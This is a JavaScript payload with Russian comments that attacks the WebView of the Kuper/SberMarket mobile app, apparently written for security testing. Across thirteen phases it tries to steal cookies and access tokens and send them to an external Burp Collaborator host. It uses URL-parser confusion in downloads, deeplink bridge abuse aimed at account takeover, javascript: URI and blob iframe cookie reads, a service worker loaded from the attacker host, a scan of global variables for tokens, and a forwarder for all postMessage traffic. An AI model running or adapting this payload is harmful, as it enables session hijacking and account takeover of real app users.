alert('step 2');

var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

function send(path, data) {
    try {
        navigator.sendBeacon(EXFIL + '/' + path,
            typeof data === 'string' ? data : JSON.stringify(data));
    } catch(e) {
        try { new Image().src = EXFIL + '/' + path + '?e=' + encodeURIComponent(e.message); } catch(e2) {}
    }
}

send('v4-started', { ts: Date.now(), origin: location.origin });


// ============================================================
// ФАЗА 1: DOWNLOAD COOKIE EXFIL — URL Parser Differential
// ============================================================
// onDownloadStart в RNCWebViewManagerImpl.smali:
//   1. DownloadManager.Request(Uri.parse(url)) — куда идёт запрос
//   2. new URL(url).getHost() → CookieManager.getCookie() — чьи куки
//   3. addRequestHeader("Cookie", cookies) — custom header
//   4. Custom headers сохраняются при 302 redirect!
//
// Тестируем URL'ы где java.net.URL и android.net.Uri
// могут парсить host по-разному:
(function downloadParserDiff() {
    try {
        var testUrls = [
            // Тест 1: Backslash confusion (CVE-2017-13274)
            // java.net.URL: userinfo=evil.com\, host=kuper.ru
            // WHATWG/Chromium: host=evil.com, path=/@kuper.ru/
            'https://evil.com\\@kuper.ru/v4-dl-backslash',

            // Тест 2: Encoded backslash
            'https://evil.com%5C@kuper.ru/v4-dl-enc-backslash',

            // Тест 3: Forward slash in userinfo (standard @)
            'https://evil.com/@kuper.ru/v4-dl-fwdslash',

            // Тест 4: Multiple @ signs
            'https://kuper.ru:443@evil.com/v4-dl-multi-at',

            // Тест 5: Tab character in URL
            'https://kuper.ru\t@evil.com/v4-dl-tab',

            // Тест 6: Null byte
            'https://kuper.ru%00@evil.com/v4-dl-null'
        ];

        // Заменяем evil.com на Burp Collaborator
        var burp = '4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

        testUrls.forEach(function(url, i) {
            setTimeout(function() {
                try {
                    var realUrl = url.replace(/evil\.com/g, burp);
                    var a = document.createElement('a');
                    a.href = realUrl;
                    a.download = 'test' + i + '.bin';
                    a.style.display = 'none';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    send('v4-dl-parser-' + i, { url: realUrl.substring(0, 200) });
                } catch(e) {
                    send('v4-dl-parser-err-' + i, { err: e.message });
                }
            }, i * 500);
        });

    } catch(e) {
        send('v4-dl-parser-outer-err', { err: e.message });
    }
})();


// ============================================================
// ФАЗА 2: DOWNLOAD + REDIRECT — куки через redirect
// ============================================================
// Если kuper.ru/sbermarket.ru имеет endpoint с redirect,
// cookies добавляются к initial request и СОХРАНЯЮТСЯ при redirect!
// DownloadManager re-adds custom headers при каждом redirect.
(function downloadRedirect() {
    setTimeout(function() {
        try {
            var burp = '4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

            // Прямой download с kuper.ru — проверяем что cookies вообще прикладываются
            var urls = [
                'https://kuper.ru/favicon.ico',
                'https://kuper.ru/robots.txt',
                'https://sbermarket.ru/favicon.ico',
                'https://api.kuper.ru/v2/app_lt_configuration',
                // Потенциальные redirect endpoints на kuper.ru:
                'https://kuper.ru/r/',
                'https://kuper.ru/redirect',
                'https://kuper.ru/go/',
                'https://kuper.ru/out/',
                'https://kuper.ru/link/',
                'https://sbermarket.ru/r/',
                'https://sbermarket.ru/redirect',
                // OAuth callback URLs
                'https://kuper.ru/oauth/callback',
                'https://kuper.ru/auth/callback',
                // Landing page redirects
                'https://landings.sbermarket.ru/',
                'https://scanpay.sbermarket.ru/'
            ];

            urls.forEach(function(url, i) {
                setTimeout(function() {
                    try {
                        var a = document.createElement('a');
                        a.href = url;
                        a.download = 'dl' + i + '.bin';
                        a.style.display = 'none';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        send('v4-dl-redirect-' + i, { url: url });
                    } catch(e) {
                        send('v4-dl-redir-err-' + i, { err: e.message });
                    }
                }, i * 300);
            });

        } catch(e) {
            send('v4-dl-redir-outer-err', { err: e.message });
        }
    }, 4000);
})();


// ============================================================
// ФАЗА 3: BRIDGE DEEPLINK с HTTPS URL
// ============================================================
// Из анализа кода:
// - openDeepLink проверяет isWebUrl (только startsWith('https://'))
// - Если true → makeOpenUrlInAppBrowserEffect
// - Возможно открывает in-app browser БЕЗ whitelist проверки
// - ВОПРОС: отправляет ли access-token header?
//
// Тестируем: отправляем deeplink с HTTPS URL на Burp Collaborator
// Если в Burp придёт запрос с access-token header → ATO!
(function bridgeHttpsDeeplink() {
    setTimeout(function() {
        try {
            var burp = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

            // Тест 1: Прямой HTTPS URL как deeplink
            window.ReactNativeWebView.postMessage(JSON.stringify({
                action: 'navigateDeepLink',
                data: {
                    deepLink: burp + '/v4-bridge-https-direct'
                }
            }));
            send('v4-bridge-https-sent', { type: 'direct' });

            // Тест 2: sbermarket://landing с URL нашего сервера
            // (whitelist не пройдёт, но может загрузить без access-token)
            setTimeout(function() {
                window.ReactNativeWebView.postMessage(JSON.stringify({
                    action: 'navigateDeepLink',
                    data: {
                        deepLink: 'sbermarket://landing?url=' +
                            encodeURIComponent(burp + '/v4-bridge-landing-nowhitelist')
                    }
                }));
                send('v4-bridge-landing-sent', { type: 'landing-no-whitelist' });
            }, 1000);

            // Тест 3: sbermarket://webview (другой deeplink handler)
            setTimeout(function() {
                window.ReactNativeWebView.postMessage(JSON.stringify({
                    action: 'navigateDeepLink',
                    data: {
                        deepLink: 'sbermarket://webview?url=' +
                            encodeURIComponent(burp + '/v4-bridge-webview')
                    }
                }));
                send('v4-bridge-webview-sent', { type: 'webview' });
            }, 2000);

            // Тест 4: sbermarket://browser
            setTimeout(function() {
                window.ReactNativeWebView.postMessage(JSON.stringify({
                    action: 'navigateDeepLink',
                    data: {
                        deepLink: 'sbermarket://browser?url=' +
                            encodeURIComponent(burp + '/v4-bridge-browser')
                    }
                }));
                send('v4-bridge-browser-sent', { type: 'browser' });
            }, 3000);

        } catch(e) {
            send('v4-bridge-err', { err: e.message });
        }
    }, 1000);
})();


// ============================================================
// ФАЗА 4: IFRAME NAVIGATION → COOKIE ACCESS
// ============================================================
// Загружаем iframe с kuper.ru. Затем пробуем:
// 1. javascript: URI в iframe → document.cookie в контексте kuper.ru
// 2. about:srcdoc с script → чтение parent.frames[0].cookie
// 3. Blob URL с redirect на kuper.ru
(function iframeCookieAccess() {
    setTimeout(function() {
        try {
            // Создаём iframe загружающий kuper.ru
            var ifr = document.createElement('iframe');
            ifr.id = 'kuper_frame';
            ifr.src = 'https://kuper.ru/';
            ifr.style.width = '1px';
            ifr.style.height = '1px';
            document.body.appendChild(ifr);

            // Ждём загрузки
            ifr.onload = function() {
                send('v4-ifr-loaded', {});

                // Попытка 1: javascript: URI навигация
                try {
                    ifr.src = 'javascript:void(parent.postMessage({t:"cookie",c:document.cookie},"*"))';
                    send('v4-ifr-jsuri-set', {});
                } catch(e) {
                    send('v4-ifr-jsuri-err', { err: e.message });
                }

                // Попытка 2: location.assign
                setTimeout(function() {
                    try {
                        ifr.contentWindow.location.assign(
                            'javascript:void(parent.postMessage({t:"cookie2",c:document.cookie},"*"))'
                        );
                    } catch(e) {
                        send('v4-ifr-assign-err', { err: e.message });
                    }
                }, 1000);

                // Попытка 3: postMessage к iframe с просьбой отправить cookies
                // (не сработает если kuper.ru не слушает postMessage)
                setTimeout(function() {
                    try {
                        ifr.contentWindow.postMessage(
                            {action: 'getCookies'}, 'https://kuper.ru'
                        );
                    } catch(e) {
                        send('v4-ifr-postmsg-err', { err: e.message });
                    }
                }, 2000);
            };

            // Попытка 4: window.open + javascript: URI
            setTimeout(function() {
                try {
                    // window.open с фичами — может обойти блокировку
                    var w = window.open('https://kuper.ru/', '_blank',
                        'width=1,height=1,left=-100,top=-100');
                    if (w) {
                        setTimeout(function() {
                            try {
                                w.location = 'javascript:void(opener.postMessage({t:"wo-cookie",c:document.cookie},"*"))';
                            } catch(e) {
                                send('v4-wo-jsuri-err', { err: e.message });
                            }
                        }, 3000);
                        send('v4-wo-opened', { type: typeof w });
                    } else {
                        send('v4-wo-null', {});
                    }
                } catch(e) {
                    send('v4-wo-err', { err: e.message });
                }
            }, 5000);

        } catch(e) {
            send('v4-ifr-outer-err', { err: e.message });
        }
    }, 8000);
})();


// ============================================================
// ФАЗА 5: REDIRECT DETECTION на kuper.ru
// ============================================================
// Ищем endpoint на kuper.ru который делает redirect.
// Если найдём — это ключ к cookie exfiltration через download handler.
// fetch с redirect:'manual' покажет нам redirect без следования.
(function redirectDetection() {
    setTimeout(function() {
        try {
            var endpoints = [
                'https://kuper.ru/',
                'https://kuper.ru/r/',
                'https://kuper.ru/redirect',
                'https://kuper.ru/go/',
                'https://kuper.ru/link/',
                'https://kuper.ru/out/',
                'https://kuper.ru/track/',
                'https://kuper.ru/click/',
                'https://sbermarket.ru/',
                'https://sbermarket.ru/redirect',
                'https://www.kuper.ru/',
                'https://www.sbermarket.ru/',
                'https://m.kuper.ru/',
                'https://kuper.ru/api/',
                'https://api.kuper.ru/',
                'https://api.kuper.ru/v2/',
                'https://kuper.ru/app/',
                'https://kuper.ru/store/',
                'https://kuper.ru/catalog/',
                'https://kuper.ru/promo/'
            ];

            endpoints.forEach(function(ep, i) {
                setTimeout(function() {
                    try {
                        // redirect:'manual' — не следуем за redirect, видим 30x ответ
                        fetch(ep, {
                            mode: 'no-cors',
                            credentials: 'include',
                            redirect: 'manual'
                        }).then(function(r) {
                            // type='opaqueredirect' = redirect detected!
                            if (r.type === 'opaqueredirect') {
                                send('v4-REDIRECT-FOUND-' + i, {
                                    url: ep,
                                    type: r.type,
                                    status: r.status
                                });
                            } else {
                                send('v4-redir-check-' + i, {
                                    url: ep,
                                    type: r.type,
                                    status: r.status,
                                    redirected: r.redirected
                                });
                            }
                        }).catch(function(e) {
                            send('v4-redir-err-' + i, { url: ep, err: e.message });
                        });
                    } catch(e) {}
                }, i * 200);
            });

        } catch(e) {
            send('v4-redir-outer-err', { err: e.message });
        }
    }, 3000);
})();


// ============================================================
// ФАЗА 6: WEBSOCKET COOKIE TEST
// ============================================================
// WebSocketModule в нативном коде добавляет cookies к upgrade request
// через ForwardingCookieHandler. Если мы откроем WS к kuper.ru
// и перехватим handshake — мы увидим cookies.
// Но WS handshake мы не можем прочитать из JS.
// Однако, если мы откроем WS к НАШЕМУ серверу через прокси...
(function wsCookieTest() {
    setTimeout(function() {
        try {
            // WS к нашему серверу — проверяем какие cookies отправятся
            var ws = new WebSocket('wss://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com/v4-ws-test');
            ws.onopen = function() {
                ws.send('ws-connected');
                send('v4-ws-opened', {});
                ws.close();
            };
            ws.onerror = function() {
                send('v4-ws-error', {});
            };
        } catch(e) {
            send('v4-ws-err', { err: e.message });
        }
    }, 15000);
})();


// ============================================================
// ФАЗА 7: PERFORMANCE/RESOURCE TIMING API
// ============================================================
// Resource Timing API может показать response headers включая
// Set-Cookie через PerformanceResourceTiming.serverTiming
// или через transferSize/encodedBodySize для cookie detection
(function resourceTiming() {
    setTimeout(function() {
        try {
            var entries = performance.getEntriesByType('resource');
            var interesting = entries.filter(function(e) {
                return e.name.indexOf('kuper') > -1 ||
                       e.name.indexOf('sbermarket') > -1;
            }).map(function(e) {
                return {
                    name: e.name,
                    type: e.initiatorType,
                    transferSize: e.transferSize,
                    serverTiming: e.serverTiming
                };
            });
            send('v4-timing', { count: entries.length, kuper: interesting });
        } catch(e) {
            send('v4-timing-err', { err: e.message });
        }
    }, 12000);
})();


// ============================================================
// ФАЗА 8: SERVICE WORKER REGISTRATION
// ============================================================
// SW может перехватить ВСЕ запросы от WebView включая те что несут cookies
(function swTest() {
    setTimeout(function() {
        try {
            if ('serviceWorker' in navigator) {
                // Попробуем зарегистрировать SW для kuper.ru scope
                navigator.serviceWorker.register(
                    'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com/sw.js',
                    { scope: '/' }
                ).then(function(reg) {
                    send('v4-sw-registered', { scope: reg.scope });
                }).catch(function(e) {
                    send('v4-sw-reg-err', { err: e.message });
                });
            } else {
                send('v4-sw-noapi', {});
            }
        } catch(e) {
            send('v4-sw-err', { err: e.message });
        }
    }, 16000);
})();


// ============================================================
// ФАЗА 9: BLOB URL + FETCH REDIRECT CHAIN
// ============================================================
// Создаём blob с HTML который при загрузке делает запрос к kuper.ru
// Blob URL может иметь другой origin
(function blobTest() {
    setTimeout(function() {
        try {
            var html = '<html><body><script>' +
                'try{' +
                'var c=document.cookie;' +
                'parent.postMessage({t:"blob-cookie",c:c},"*");' +
                '}catch(e){parent.postMessage({t:"blob-err",e:e.message},"*")}' +
                '<\/script></body></html>';

            var blob = new Blob([html], {type: 'text/html'});
            var url = URL.createObjectURL(blob);

            var ifr = document.createElement('iframe');
            ifr.src = url;
            ifr.style.display = 'none';
            document.body.appendChild(ifr);

            send('v4-blob-created', { url: url });

            // Также попробуем data: URI iframe
            setTimeout(function() {
                var ifr2 = document.createElement('iframe');
                ifr2.src = 'data:text/html,<script>parent.postMessage({t:"data-cookie",c:document.cookie},"*")<\/script>';
                ifr2.style.display = 'none';
                document.body.appendChild(ifr2);
            }, 1000);

        } catch(e) {
            send('v4-blob-err', { err: e.message });
        }
    }, 17000);
})();


// ============================================================
// ФАЗА 10: НАВИГАЦИЯ + HISTORY BACK ДЛЯ COOKIE INJECTION
// ============================================================
// Идея: навигируем WebView на kuper.ru, потом history.back()
// При загрузке kuper.ru, injectedJS из RN выполнится
// (callInjectedJavaScript в onPageFinished)
// Если мы можем установить injectedJS через bridge...
(function navigationTest() {
    setTimeout(function() {
        try {
            // Проверяем можно ли установить injectedJS через bridge
            window.ReactNativeWebView.postMessage(JSON.stringify({
                action: 'navigateDeepLink',
                data: {
                    // Пробуем deeplink который откроет kuper.ru в ЭТОМ же WebView
                    deepLink: 'sbermarket://landing?url=' +
                        encodeURIComponent('https://kuper.ru/')
                }
            }));
            send('v4-nav-kuper-sent', {});

        } catch(e) {
            send('v4-nav-err', { err: e.message });
        }
    }, 20000);
})();


// ============================================================
// ФАЗА 11: ПЕРЕХВАТ ВСЕХ СООБЩЕНИЙ
// ============================================================
window.addEventListener('message', function(e) {
    send('v4-msg-received', {
        origin: e.origin,
        data: typeof e.data === 'string' ? e.data.substring(0, 2000) :
              JSON.stringify(e.data).substring(0, 2000)
    });
});


// ============================================================
// ФАЗА 12: ПРОВЕРКА window.__NEXT_DATA__ и подобных объектов
// ============================================================
// Некоторые SPA хранят токены в глобальных переменных
(function globalScan() {
    setTimeout(function() {
        try {
            var found = {};
            var patterns = [
                '__NEXT_DATA__', '__NUXT__', '__INITIAL_STATE__',
                '__APP_DATA__', '__PRELOADED_STATE__', '__REDUX_STATE__',
                'accessToken', 'access_token', 'authToken', 'token',
                'csrfToken', 'csrf_token', '_token'
            ];
            patterns.forEach(function(p) {
                try {
                    if (window[p] !== undefined) {
                        found[p] = typeof window[p] === 'string' ?
                            window[p].substring(0, 200) :
                            JSON.stringify(window[p]).substring(0, 500);
                    }
                } catch(e) {}
            });
            send('v4-globals', found);
        } catch(e) {}
    }, 2000);
})();


// ============================================================
// ФАЗА 13: BRIDGE — ПОЛНОЕ ПЕРЕЧИСЛЕНИЕ ДОСТУПНЫХ ДЕЙСТВИЙ
// ============================================================
(function bridgeEnum() {
    setTimeout(function() {
        try {
            var d = {};

            // injectedObjectJson
            try {
                var json = window.ReactNativeWebView.injectedObjectJson();
                d.json = json;
                if (json && json !== '{}') {
                    try { d.parsed = JSON.parse(json); } catch(e) {}
                }
            } catch(e) { d.jsonErr = e.message; }

            // Все доступные методы/свойства bridge
            try {
                d.keys = Object.keys(window.ReactNativeWebView);
                d.protoKeys = Object.getOwnPropertyNames(
                    Object.getPrototypeOf(window.ReactNativeWebView)
                );
            } catch(e) { d.enumErr = e.message; }

            // Проверяем есть ли landingConstructor
            try {
                d.landingConstructor = window.ReactNativeWebView.landingConstructor;
            } catch(e) {}

            // Пробуем разные action'ы через bridge
            var actions = [
                'getCookies', 'getToken', 'getAccessToken',
                'getUserData', 'getUser', 'getSession',
                'getConfig', 'getHeaders', 'getState'
            ];

            actions.forEach(function(action) {
                try {
                    window.ReactNativeWebView.postMessage(JSON.stringify({
                        action: action,
                        data: {}
                    }));
                } catch(e) {}
            });

            send('v4-bridge-enum', d);
        } catch(e) {
            send('v4-bridge-enum-err', { err: e.message });
        }
    }, 2500);
})();

send('v4-payload-loaded', { ts: Date.now(), phases: 13 });
